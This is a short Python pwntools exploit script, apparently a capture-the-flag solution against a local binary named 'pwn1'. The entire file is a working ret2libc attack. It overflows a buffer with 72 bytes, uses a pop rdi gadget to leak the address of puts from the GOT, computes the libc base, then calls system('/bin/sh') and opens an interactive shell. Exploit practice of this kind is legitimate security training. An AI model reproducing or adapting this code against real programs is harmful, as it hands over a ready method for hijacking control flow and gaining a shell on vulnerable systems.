from pwn import *

p = process("./pwn1")
elf = ELF("pwn1")
libc = elf.libc

#main = p64(0x4003f4)
pop_rdi = p64(0x0000000000400783) #: pop rdi ; ret

payload = "A"*72
payload += pop_rdi
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(0x00400698) #main

p.sendlineafter(": ",payload)

leak = u64(p.recv(6).strip().ljust(8, b"\x00"))
libc.address = leak - libc.symbols['puts']
system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh\x00'))

payload = "A"*72
payload += pop_rdi
payload += p64(bin_sh)
payload += p64(system)
#payload += p64(0x400536) # ret

p.sendlineafter(": ", payload)

p.interactive()
